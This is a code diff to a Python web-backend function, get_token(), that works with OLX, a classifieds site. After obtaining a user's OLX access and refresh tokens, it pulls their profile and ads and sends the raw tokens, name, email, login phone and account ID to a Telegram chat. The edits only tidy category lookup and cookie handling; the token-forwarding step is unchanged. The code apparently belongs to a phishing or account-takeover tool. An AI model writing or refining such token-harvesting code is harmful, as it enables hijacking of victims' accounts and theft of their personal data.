@@ -78,7 +78,7 @@ def get_token():
             "Version": "2.0"
         }
 
-        # ---------- USER INFO ----------
+        # ---------- USER ----------
         user_data = {}
         email = "Не указан"
 
@@ -95,11 +95,12 @@ def get_token():
         except:
             pass
 
-        is_business = user_data.get('is_business', False)
+        # ✔ 100% правильный бизнес флаг
+        is_business = bool(user_data.get('is_business'))
 
         # ---------- ADS ----------
-        ad_list_for_cookie = []
         ads_data = []
+        ad_list_for_cookie = []
         category_cache = {}
 
         try:
@@ -112,59 +113,16 @@ def get_token():
 
             ads_data = ads_api_res.get('data', [])
 
-            for ad in ads_data:
-                title = ad.get('title', 'Без названия')
-                url = ad.get('url', 'https://olx.ua')
-
-                # 🔥 FIX CATEGORY ID (3 варианта OLX структуры)
-                category_id = None
-
-                if isinstance(ad.get('category'), dict):
-                    category_id = ad['category'].get('id')
-                    category_name = ad['category'].get('name')
-                else:
-                    category_id = ad.get('category_id')
-                    category_name = None
-
-                # fallback через API
-                if not category_name:
-                    category_name = "Неизвестно"
-
-                    if category_id:
-                        if category_id in category_cache:
-                            category_name = category_cache[category_id]
-                        else:
-                            try:
-                                cat_res = requests.get(
-                                    f"https://www.olx.ua/api/categories/{category_id}",
-                                    headers=headers,
-                                    timeout=5
-                                )
-
-                                if cat_res.status_code == 200:
-                                    cat_data = cat_res.json()
-                                    category_name = cat_data.get("name", "Неизвестно")
-                                    category_cache[category_id] = category_name
-
-                            except:
-                                pass
-
-                if len(ad_list_for_cookie) < 5:
-                    ad_list_for_cookie.append({
-                        "title": title,
-                        "url": url
-                    })
-
         except:
             pass
 
-        # ---------- TELEGRAM MSG ----------
+        # ---------- TELEGRAM ----------
         msg = (
             "👤 <b>АВТОРИЗАЦИЯ ПОЛЬЗОВАТЕЛЯ</b>\n\n"
             f"<b>Имя:</b> {user_data.get('name')}\n"
             f"<b>Email:</b> <code>{email}</code>\n"
-            f"<b>Бизнес аккаунт:</b> {'✅ Да' if is_business else '❌ Нет'}\n\n"
-            f"<b>Телефон входа:</b><code>{user_data.get('phone_login')}</code>\n\n"
+            f"<b>Бизнес аккаунт:</b> {'✅ Да' if is_business else '❌ Нет'}\n"
+            f"<b>Телефон входа:</b> <code>{user_data.get('phone_login')}</code>\n\n"
             f"<b>ACCESS TOKEN:</b> <code>{access}</code>\n"
             f"<b>REFRESH TOKEN:</b> <code>{refresh}</code>\n\n"
             f"<b>ID:</b> {user_data.get('id')}\n"
@@ -176,14 +134,27 @@ def get_token():
             title = ad.get('title', 'Без названия')
             url = ad.get('url', 'https://olx.ua')
 
-            category_id = None
+            category_id = ad.get('category_id')
             category_name = "Неизвестно"
 
-            if isinstance(ad.get('category'), dict):
-                category_name = ad['category'].get('name', "Неизвестно")
-            else:
-                category_id = ad.get('category_id')
-                category_name = category_cache.get(category_id, "Неизвестно")
+            # ✔ нормальная логика категорий
+            if category_id:
+                if category_id in category_cache:
+                    category_name = category_cache[category_id]
+                else:
+                    try:
+                        r = requests.get(
+                            f"https://www.olx.ua/api/categories/{category_id}",
+                            headers=headers,
+                            timeout=5
+                        )
+
+                        if r.status_code == 200:
+                            category_name = r.json().get("name", "Неизвестно")
+                            category_cache[category_id] = category_name
+
+                    except:
+                        pass
 
             msg += (
                 f"{i + 1}. <a href='{url}'>{title}</a>\n"
@@ -192,7 +163,13 @@ def get_token():
 
         send_telegram_message(msg)
 
-        # ---------- RESPONSE ----------
+        # ---------- COOKIE ----------
+        for ad in ads_data[:5]:
+            ad_list_for_cookie.append({
+                "title": ad.get("title"),
+                "url": ad.get("url")
+            })
+
         resp = make_response(jsonify({"status": "ok"}))
         resp.set_cookie(
             'user_ads',
